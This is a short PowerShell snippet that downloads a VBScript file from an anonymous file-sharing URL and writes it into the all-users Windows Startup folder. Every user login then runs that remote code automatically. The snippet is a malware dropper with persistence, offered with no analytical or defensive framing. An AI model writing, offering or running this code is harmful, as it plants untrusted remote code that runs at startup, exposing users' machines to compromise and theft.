$url = "https://files.catbox.moe/9lepqn.vbs"
$destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $destination
